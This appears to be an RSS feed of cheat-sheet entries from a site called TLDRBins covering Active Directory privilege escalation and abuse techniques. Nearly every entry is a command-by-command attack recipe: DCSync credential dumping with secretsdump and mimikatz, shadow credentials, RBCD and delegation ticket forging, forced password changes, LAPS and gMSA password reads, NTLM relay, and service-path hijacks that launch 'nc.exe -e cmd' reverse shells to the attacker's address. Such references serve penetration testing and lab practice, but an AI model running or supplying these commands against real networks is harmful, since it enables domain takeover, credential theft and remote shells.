channel.title: Active Driectory on TLDRBins
channel.description: Recent content in Active Driectory on TLDRBins

item.title: Account Operators
item.description: Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force 4. Create a new user account New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password -Credential $cred 5.

item.title: AD Recycle Bin
item.description: Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq <DELETED_USER> } -includeDeletedObjects -property * 4. Restore the deleted account # Rename the target account to avoid user exists error Restore-ADObject -Identity <OBJECT_GUID> -NewName '<NEW_USER>' -TargetPath 'CN=Users,DC=<EXAMPLE>,DC=<COM>'

item.title: ADCS
item.description: Enum (From Linux) certipy-ad nxc certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .

item.title: AddKeyCredentialLink
item.description: Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type' pip3 install -I pyopenssl==24.0.0 2. Request TGT using the PFX sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.

item.title: ADFS
item.description: Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe Ref: ADFSDump 2. Convert to binary blob # Copy private key(s) echo '<PRIVATE_KEY>' | sed 's/-//g' | xxd -r -p > DkmKey.bin # Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End cat b64_blob | base64 -d > EncryptedPfx.bin 3. Check which private key is correct # The correct key will not show error python ADFSpoof.

item.title: AllowedToDelegate
item.description: Privesc #1: Forge a Ticket Linux Windows 1. Get a service ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn <SERVICE>/<TARGET_DOMAIN> -hashes :<HASH> -impersonate Administrator '<DOMAIN>/<USER>' 2. Remote export KRB5CCNAME=Administrator.ccache sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@<DC> Note: impacket-wmiexec may not work 1. TO-DO TO-DO

item.title: Bloodhound
item.description: Info Collection (From Linux) bloodhound-python # With password bloodhound-python -d <DOMAIN> -u <USER> -p '<PASSWORD>' -dc <DC> -ns <DC_IP> -c all --zip # With Kerberos sudo ntpdate -s <DC> && bloodhound-python -u <USER> -k -d <DOMAIN> -dc <DC> -ns <DC_IP> -c all --zip -no-pass --use-ldaps Note: passing '-no-pass' will still ask for password, press enter Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .

item.title: Built-in Group
item.description: Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp <LOCAL_PORT> Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config <SERVICE> binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>" 2. Restart service # Stop service sc.exe stop <SERVICE> # Start service sc.exe start <SERVICE>

item.title: Constrained Delegation
item.description: Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k 2. Get a service ticket impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate administrator '<DOMAIN>/<USER>' -hashes :<HASH> -self # Check forwardable flag describeTicket.py <TICKET_1>.ccache 3. RBCD Attack # Add delegation impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from <USER> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps # Check sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k 4.

item.title: Cross Session Relay
item.description: Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:<RELAY_PORT> 2. Trigger auth request .\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x <LOCAL_IP> -p <RELAY_PORT> Ref: RemotePotato0 1. All-in-one .\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 "C:\ProgramData\KrbRelay.

item.title: ExecuteDCOM
item.description: Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20

item.title: ForceChangePassword
item.description: Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password <TARGET_USER> '<NEW_PASSWORD>' Ref: bloodyAD rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>' Change target user password (From Windows) Windows 1. Import PowerView . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password

item.title: GenericAll
item.description: Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl 2. Change password bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Ref: bloodyAD 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC> Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.

item.title: GetChanges/GetChangesAll
item.description: Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>' # With hashes impacket-secretsdump -hashes <HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>' .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit

item.title: Krbrelayx
item.description: Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <TARGET_RECORD> --data <LOCAL_IP> <TARGET_IP> Ref: krbrelayx tools

item.title: NTLM Relay Attack
item.description: NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata') .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 Ref: socat 2. Enable webdav (In Windows Target) $Source = @" using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.

item.title: RBCD Attack
item.description: RBCD Attack Linux Windows 0. Check machine account quota nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <TARGET> '<DOMAIN>/<USER>:<PASSWORD>' 2. Rbcd attack impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>' 3. Impersonate sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>' 4. Import ticket export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache 5. Post-Attack # Remote sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass # Or secretsdump impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator 1.

item.title: ReadGMSAPassword
item.description: Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <DC> -d <DOMAIN> Ref: gMSADumper python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword Ref: bloodyAD nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).

item.title: ReadLAPSPassword
item.description: Abuse #1: Read LAPS Password Linux Windows ldapsearch -h <TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<TARGET> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred

item.title: Server Operators
item.description: Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>" 2. Restart service # Stop service sc.exe stop <SERVICE> # Start service sc.exe stop <SERVICE> Additional: Create service # Create a service sc.exe create <NEW_SERVICE> binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments

item.title: WriteDacl
item.description: Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'

item.title: WriteOwner/Own
item.description: Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <TARGET_USER> Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add full control permission to the user over the group sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -inheritance -action write -rights FullControl 2.
